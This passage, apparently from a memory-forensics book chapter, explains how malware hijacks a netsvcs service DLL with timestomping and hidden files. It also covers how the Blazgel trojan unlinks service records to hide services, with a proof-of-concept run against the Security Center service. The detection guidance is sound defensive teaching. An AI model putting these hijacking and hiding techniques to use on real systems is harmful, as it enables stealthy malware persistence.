+• Lines 11-23: Opens the Svchost registry key and queries for the netsvcs value. This
+  returns a REG_MULTI_SZ (list of strings) with the names of all services in the group
+  that require network access. The malware iterates through the list and chooses
+  one to hijack. By leveraging the netsvcs group rather than just choosing a ser-
+  vice at random, the malware ensures that network functionality will be available
+  (dependency-wise).
+• Lines 24-54: For each service in the netsvcs group, the malware queries for the
+  ServiceDll path under the Parameters subkey. It then expands any environment
+
+          variables (such as %SystemRoot%) to obtain the full path and stores the result in
+          FileName.
+        • Lines 55-66: The malware builds two temporary file paths to prepare for the rest
+          of the infection. It then copies the original service binary to OrigFileCopy (with the
+          .txt extension) and drops the new DLL to an initial location of NewDllFile (with
+          the .tmp extension).
+        • Lines  67-97: The malware opens a handle to the original service binary (FileName)
+          and reads the last 1024 bytes of the file into a buffer, which it then scans for the
+          presence of szInfectSignature. If the signature is found, the loop progresses to
+          the next service in the netsvcs group because the current service has already been
+          replaced.
+        • Lines 98-113: Retrieves a binary resource from the malware’s resource section
+          (the body of the replacement DLL) and opens a handle to NewDllFile to prepare
+          to write it to disk.
+        • Lines 114-132: The malware changes the file system’s metadata (the timestamps, in
+          particular) to make it appear as if the new DLL was actually created on 2/18/2005
+          at 20:02:00. Then it writes the resource data to the file.
+        • Lines 133-145: Appends the infection signature to the end of the new DLL, to pre-
+          vent the same malware from replacing it again in the future.
+        • Lines 146-167: The malware moves the new DLL (NewDllFile) from the temporary
+          directory to the location of the original binary (FileName). It sets the NTFS hidden
+          attribute so that users would need to change Explorer’s default settings before
+          seeing the file in directory listings. Finally, it deletes both temporary files.
+
+     Detecting Disk-based Hijacks
+     Detecting the disk-based hijack in memory isn’t as straightforward as the registry-based
+     method because nothing changed besides the file’s content. Short of looking for artifacts
+     the new DLL creates when it loads (that is, connections, API hooks), you can dump all
+     DLLs and compare them with baseline copies to try to determine if any were replaced.
+     Keep in mind that the hashes of DLLs dumped from memory will never match the ones
+     on disk, but you could base the analysis on other factors such as file size, PE header com-
+     pilation timestamp, and so on. If anything looks different, you could disassemble the
+     code for verification purposes.
+
+     Revealing Hidden Services
+     As we have alluded to earlier in the chapter, it is possible for malware to hide services.
+     For example, Blazgel (http://www.threatexpert.com/threats/backdoor-win32-blazgel
+     .html) scans the memory of services.exe from 0x300000 to 0x5000000 looking for its
+
+target service. It essentially looks for the ServiceName member of the _SERVICE_RECORD
+structure. As shown in Figure 12-3, when it finds a positive match, it subtracts 8 (see the lea
+eax,[esi-8] instruction) because the ServiceName member is at offset 8 of the _SERVICE_
+RECORD structure on 32-bit systems. This gives Blazgel a pointer to the base address of the
+_SERVICE_RECORD structure. Next, it overwrites the Flink and Blink values of the next and
+previous structures, respectively, which effectively makes the target service “disappear”
+from all service listings on the live machine.
+
+Looking for
+ the service
+     to hide
+
+ The unlink
+occurs here
+
+Figure 12-3: The Blazgel Trojan hides services by unlinking them.
+
+   At this point, users can no longer rely on any of the aforementioned methods of enu-
+merating services on the live machine (that is, MMC, sc query, PowerShell, or PsService
+.exe). Although the hidden service is still running, the SCM has no knowledge that it
+exists, and thus the results of most analysis tools will be tainted. As an example, consider
+
+     a system that runs the Windows Security Center service. You can get details about the
+     service by typing the following command:
+       C:\>sc query wscsvc
+
+       SERVICE_NAME: wscsvc
+         TYPE               : 20 WIN32_SHARE_PROCESS
+         STATE              : 4 RUNNING
+                             (STOPPABLE,NOT_PAUSABLE,ACCEPTS_SHUTDOWN)
+         WIN32_EXIT_CODE    : 0 (0x0)
+         SERVICE_EXIT_CODE : 0 (0x0)
+         CHECKPOINT         : 0x0
+         WAIT_HINT          : 0x0
+
+        You can see that the service is running. Now stop the service with net stop and then
+     requery for the service’s status. You should see that it is in the stopped state:
+       C:\>net stop wscsvc
+       The Security Center service is stopping.
+       The Security Center service was stopped successfully.
+
+       C:\>sc query wscsvc
+
+       SERVICE_NAME: wscsvc
+         TYPE               : 20 WIN32_SHARE_PROCESS
+         STATE              : 1 STOPPED
+                             (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
+         WIN32_EXIT_CODE    : 0 (0x0)
+         SERVICE_EXIT_CODE : 0 (0x0)
+         CHECKPOINT         : 0x0
+         WAIT_HINT          : 0x0
+
+        Figure 12-4 shows how the output of svcscan appears both before and after stopping the
+     service. To generate these visuals, you can add the --output=dot option to your Volatility
+     command. As you can see, in both cases, wscsvc sits between the WmiApSrv and wuauserv
+     services in the doubly linked list.
+        Now, to simulate what would happen when malware hides a service, you can use a proof-
+     of-concept program to perform the unlinking. Both the source code and compiled execut-
+     able for the program are available here: https://code.google.com/p/malwarecookbook/
+     source/browse/trunk/17/10/UnlinkServiceRecord.zip. The following output shows that
+     immediately after unlinking wscsvc, the sc query command produces an error:
+       C:\>UnlinkServiceRecord.exe wscsvc
+
+       [!] Service to hide: wscsvc
+       [!] SCM Process ID: 0x28c
+       [!] Found PsServiceRecordListHead at 0x6e1e90
+       [!] Found a matching SERVICE_RECORD structure at 0x6ea3d0!
+
+   C:\>sc query wscsvc
+   [SC] EnumQueryServicesStatus:OpenService FAILED 1060:
+
+   The specified service does not exist as an installed service.
+
+Figure 12-4: The wscsvc service in a running and stopped state
+
+   Because wscsvc is unlinked from the list, it does not show up in the sc query output,
+the MMC list, or the list of running services produced by third-party applications such as
+PsService, GMER, and Process Hacker. However, as shown in Figure 12-5, the _SERVICE_
+RECORD structure for wscsvc still exists in the memory of services.exe. Furthermore, the
+Flink and Blink values for wscsvc still point to WmiApSrv and wuauserv, but nothing points
+to wscsvc, thus isolating it from the linked-list.
+   You can take a few important facts away from this discussion about hidden services.
+First, a service remains in the doubly linked list even when in the stopped state. Second,
+a service process remains active even when a malicious program unlinks its _SERVICE_
+RECORD structure.
+
+              0x6ea228
+      WmdmPmSN (Portable Media[ . . . ]
+          SERVICE_STOPPED
+
+                0x6ea2b8                                  0x6ea3d0
+      Wmi (Windows Management [ . . . ]            wscsvc (Security Center)
+            SERVICE_STOPPED                         SERVICE_RUNNING
+
+                    0x6ea340
+          WmiApSrv (WMI Performanc[ . . . ]
+               SERVICE_STOPPED
+
+                      0x6ea460
+           wuauserv (Automatic Upda[ . . . ]
+                SERVICE_RUNNING
+
+     Figure 12-5: The wscsvc service has been unlinked from the list.
+
+     Summary
+     Over the years, attackers have used and abused the service architecture in various ways.
+     As one of the primary persistence mechanisms that even “advanced” threat groups utilize,
+     analysts need a thorough understanding of service-related evidence to be effective on
+     their cases. It’s also critical to know the limitations of live tools that enumerate services
+     and how rootkits can hide their presence. By combining artifacts in memory with similar
+     clues on disk, such as the registry hives, you can combat the hiding techniques and often
+     get a comprehensive view of the current configurations for services on a suspect system.
